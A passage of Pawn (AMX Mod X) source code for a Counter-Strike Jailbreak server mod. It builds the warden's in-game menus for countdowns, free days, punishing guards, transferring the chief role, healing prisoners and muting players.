    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
        case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_ChiefMenu_1(id);
        }
        default: iLen = formatex(szMenu, charsmax(szMenu), "\wОтобрать розыск [%d/%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_TakeWanted");
}

public Handle_TakeWanted(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 8: return Show_TakeWanted(id, ++g_iMenuPosition[id]);
        case 9: return Show_TakeWanted(id, --g_iMenuPosition[id]);
        default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            new szName[32], szTargetName[32];
            get_user_name(id, szName, charsmax(szName));
            get_user_name(iTarget, szTargetName, charsmax(szTargetName));
            if(IsSetBit(g_iBitUserWanted, iTarget))
            {
                UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_TAKE_WANTED", szName, szTargetName);
                jbe_sub_user_wanted(iTarget);
            }
        }
    }
    return Show_TakeWanted(id, g_iMenuPosition[id]);
}
/* <- Начальник - Отобрать розыск */

Show_CountDownMenu(id)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<5|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_COUNT_DOWN_TITLE");
	if(task_exists(TASK_COUNT_DOWN_TIMER))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COUNT_DOWN_3");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COUNT_DOWN_5");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COUNT_DOWN_10");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COUNT_DOWN_15");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COUNT_DOWN_30");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wОстановить отчёт^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dГонг^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dСвисток^n");
	}
	else
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_COUNT_DOWN_3");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_COUNT_DOWN_5");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_COUNT_DOWN_10");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_COUNT_DOWN_15");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_COUNT_DOWN_30");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dОстановить отчёт^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wГонг^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \wСвисток^n");
		iKeys |= (1<<0|1<<1|1<<2|1<<3|1<<4|1<<6|1<<7);
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_CountDownMenu");
}

public Handle_CountDownMenu(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: g_iCountDown = 4;
		case 1: g_iCountDown = 6;
		case 2: g_iCountDown = 11;
		case 3: g_iCountDown = 16;
		case 4: g_iCountDown = 31;
		case 5: 
		{
			if(task_exists(TASK_COUNT_DOWN_TIMER)) 
			{
			    remove_task(TASK_COUNT_DOWN_TIMER);
			    g_iCountDown = 0;
				return Show_ChiefMenu_1(id);
			}
		}
		case 6: emit_sound(0, CHAN_AUTO, "jb_engine/boxing/gong.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		case 7: UTIL_SendAudio(0, _, g_szSounds[SIMON_SVISTOK]);
		case 8: return Show_ChiefMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	set_task(1.0, "jbe_count_down_timer", TASK_COUNT_DOWN_TIMER, _, _, "a", g_iCountDown);
	
	return Show_CountDownMenu(id);
}

public jbe_count_down_timer()
{
	if(--g_iCountDown) client_print(0, print_center, "%L", LANG_PLAYER, "JBE_MENU_COUNT_DOWN_TIME", g_iCountDown);
	else client_print(0, print_center, "%L", LANG_PLAYER, "JBE_MENU_COUNT_DOWN_TIME_END");
	UTIL_SendAudio(0, _, "jb_engine/zone_cntdwn_robo/%d.wav", g_iCountDown);
}

Cmd_FreeDayControlMenu(id) return Show_FreeDayControlMenu(id, g_iMenuPosition[id] = 0);
Show_FreeDayControlMenu(id, iPos)
{
	if(iPos < 0 || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 || IsSetBit(g_iBitUserFreeNextRound, i) || IsSetBit(g_iBitUserWanted, i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_FREE_DAY_CONTROL_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \r[%L]^n", ++b, szName, i, IsSetBit(g_iBitUserFree, i) ? "JBE_MENU_FREE_DAY_CONTROL_TAKE" : "JBE_MENU_FREE_DAY_CONTROL_GIVE");
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_FreeDayControlMenu");
}

public Handle_FreeDayControlMenu(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 8: return Show_FreeDayControlMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_FreeDayControlMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(g_iUserTeam[iTarget] != 1 || IsSetBit(g_iBitUserFreeNextRound, iTarget) || IsSetBit(g_iBitUserWanted, iTarget)) return Show_FreeDayControlMenu(id, g_iMenuPosition[id]);
			new szName[32], szTargetName[32];
			get_user_name(id, szName, charsmax(szName));
			get_user_name(iTarget, szTargetName, charsmax(szTargetName));
			if(IsSetBit(g_iBitUserFree, iTarget))
			{
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_TAKE_FREE_DAY", szName, szTargetName);
				jbe_sub_user_free(iTarget);
			}
			else
			{
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_GIVE_FREE_DAY", szName, szTargetName);
				if(IsSetBit(g_iBitUserAlive, iTarget)) jbe_add_user_free(iTarget);
				else
				{
					jbe_add_user_free_next_round(iTarget);
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_AUTO_FREE_DAY", szTargetName);
				}
			}
		}
	}
	return Show_FreeDayControlMenu(id, g_iMenuPosition[id]);
}

Cmd_PunishGuardMenu(id) return Show_PunishGuardMenu(id, g_iMenuPosition[id] = 0);
Show_PunishGuardMenu(id, iPos)
{
	if(iPos < 0 || g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 2 || i == g_iChiefId || IsSetBit(g_iBitUserAdmin, i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_2(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_PUNISH_GUARD_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PunishGuardMenu");
}

public Handle_PunishGuardMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 8: return Show_PunishGuardMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_PunishGuardMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(g_iUserTeam[iTarget] == 2)
			{
				if(jbe_set_user_team(iTarget, 1))
				{
					new szName[32], szTargetName[32];
					get_user_name(id, szName, charsmax(szName));
					get_user_name(iTarget, szTargetName, charsmax(szTargetName));
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PUNISH_GUARD", szName, szTargetName);
				}
			}
		}
	}
	return Show_PunishGuardMenu(id, g_iMenuPosition[id]);
}

Cmd_TransferChiefMenu(id) return Show_TransferChiefMenu(id, g_iMenuPosition[id] = 0);
Show_TransferChiefMenu(id, iPos)
{
	if(iPos < 0 || g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 2 || IsNotSetBit(g_iBitUserAlive, i) || i == g_iChiefId) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_TRANSFER_CHIEF_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_TransferChiefMenu");
}

public Handle_TransferChiefMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 8: return Show_TransferChiefMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_TransferChiefMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(jbe_set_user_chief(iTarget))
			{
				new szName[32], szTargetName[32];
				get_user_name(id, szName, charsmax(szName));
				get_user_name(iTarget, szTargetName, charsmax(szTargetName));
				set_pev(id, pev_health, 500.0 );
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_TRANSFER_CHIEF", szName, szTargetName);
				UTIL_SendAudio(0, _, g_szSounds[NEW_SIMON]);
				return PLUGIN_HANDLED;
			}
		}
	}
	return Show_TransferChiefMenu(id, g_iMenuPosition[id]);
}

Cmd_TreatPrisonerMenu(id) return Show_TreatPrisonerMenu(id, g_iMenuPosition[id] = 0);
Show_TreatPrisonerMenu(id, iPos)
{
	if(iPos < 0 || g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i) || get_user_health(i) >= 100 || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_TREAT_PRISONER_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \r[%d HP]^n", ++b, szName, get_user_health(i));
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_TreatPrisonerMenu");
}

public Handle_TreatPrisonerMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 8: return Show_TreatPrisonerMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_TreatPrisonerMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(g_iUserTeam[iTarget] == 1 && IsSetBit(g_iBitUserAlive, iTarget) && get_user_health(iTarget) < 100 && IsNotSetBit(g_iBitUserBoxing, id) && IsNotSetBit(g_iBitUserDuel, id))
			{
				new szName[32], szTargetName[32];
				get_user_name(id, szName, charsmax(szName));
				get_user_name(iTarget, szTargetName, charsmax(szTargetName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_TREAT_PRISONER", szName, szTargetName);
				set_pev(iTarget, pev_health, 100.0);
			}
		}
	}
	return Show_TreatPrisonerMenu(id, g_iMenuPosition[id]);
}

Show_ChiefMenu_2(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_CHIEF_TITTLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_CHIEF_PUNISH_GUARD");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserSuperSimon, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MAIN_SUPER_SIMON");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_SUPER_SIMON");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserDemon, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MAIN_PORTAL");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_PORTAL");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ChiefMenu_2");
}

public Handle_ChiefMenu_2(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: return Cmd_PunishGuardMenu(id);
		case 1: return Show_SimonSuperMenu(id);
		case 2: return Show_PortalMenu(id);
		case 8: return Show_ChiefMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ChiefMenu_2(id);
}

Cmd_VoiceControlMenuSimon(id)
{
    if(id != g_iChiefId) return PLUGIN_HANDLED;
    
    return Show_VoiceControlMenu(id, g_iMenuPosition[id] = 0);
}

Cmd_VoiceControlMenuAdmin(id)
{
    if(IsNotSetBit(g_iBitUserAdmin, id)) return PLUGIN_HANDLED;
    
    return Show_VoiceControlMenu(id, g_iMenuPosition[id] = 0);
}

Show_VoiceControlMenu(id, iPos)
{
    if(iPos < 0 || g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
        case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_ChiefMenu_1(id);
        }
        default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_VOICE_CONTROL_TITLE", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \r[%L]^n", ++b, szName, id, IsSetBit(g_iBitUserVoice, i) ? "JBE_MENU_CHIEF_VOICE_CONTROL_TAKE" : "JBE_MENU_CHIEF_VOICE_CONTROL_GIVE");
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_VoiceControlMenu");
}

public Handle_VoiceControlMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId && IsNotSetBit(g_iBitUserAdmin, id) || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 8: return Show_VoiceControlMenu(id, ++g_iMenuPosition[id]);
        case 9: return Show_VoiceControlMenu(id, --g_iMenuPosition[id]);
        default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            if(IsNotSetBit(g_iBitUserAlive, iTarget) || g_iUserTeam[iTarget] != 1) return Show_VoiceControlMenu(id, g_iMenuPosition[id]);
            new szName[32], szTargetName[32];
            get_user_name(id, szName, charsmax(szName));
            get_user_name(iTarget, szTargetName, charsmax(szTargetName));
            if(IsSetBit(g_iBitUserVoice, iTarget))
            {
                ClearBit(g_iBitUserVoice, iTarget);
                if(IsNotSetBit(g_iBitUserAdmin, id))
                {
                    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_TAKE_VOICE", szName, szTargetName);
                }
                else
                {
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ADMIN_TAKE_GOL", szName, szTargetName);
                }
            }
            else
            {
                SetBit(g_iBitUserVoice, iTarget);
                if(IsNotSetBit(g_iBitUserAdmin, id))
                {
                    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_GIVE_VOICE", szName, szTargetName);
                }
                else
                {
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ADMIN_GIVE_GOL", szName, szTargetName);
                }
            }
        }
    }
    return Show_VoiceControlMenu(id, g_iMenuPosition[id]);
}

Show_MiniGameMenu_1(id)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MINI_GAME_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MINI_GAME_SOCCER");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MINI_GAME_BOXING");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MINI_GAME_SPRAY");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_MINI_GAME_DISTANCE_DROP");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L %s^n", id, "JBE_MENU_MINI_GAME_FRIENDLY_FIRE", g_iFriendlyFire ? "\yВкл" : "\rВыкл");
